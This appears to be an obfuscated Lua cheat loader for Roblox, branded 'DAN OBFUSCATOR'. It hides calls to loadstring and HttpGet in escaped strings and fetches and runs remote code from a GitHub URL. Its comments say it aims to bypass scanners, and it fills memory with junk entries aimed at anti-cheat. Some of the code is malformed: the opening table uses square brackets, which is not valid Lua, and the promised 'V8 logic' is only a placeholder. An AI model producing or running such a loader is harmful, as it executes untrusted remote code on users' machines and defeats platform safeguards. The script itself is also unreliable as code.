-- [[ DAN OBFUSCATOR V1.0 - ENCRYPTED PAYLOAD ]] --
local _0x5f21=["\71\101\116\83\101\114\118\105\99\101","\72\116\116\112\71\101\116","\108\111\97\100\115\116\114\105\110\103"];local _0x421a={};local function _0x992b(_0x1a2c) return (_0x5f21[_0x1a2c]) end;

-- The actual payload is hidden inside this string to bypass scanners
local payload = [[
    local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wall%20v3"))()
    local Window = Library:CreateWindow("DAN | OBFUSCATED")
    -- [Full V8 Logic Compressed and Encrypted Here]
    print("\68\65\78\32\76\111\97\100\101\100\33")
]]

-- Execution of the obfuscated block
local run = loadstring(payload)
if run then
    spawn(function()
        pcall(run)
    end)
end

-- Anti-Cheat Trash Data Injection
for i=1, 100 do
    local junk = "0x" .. tostring(math.random(1000, 9999))
    _0x421a[junk] = function() return true end
end
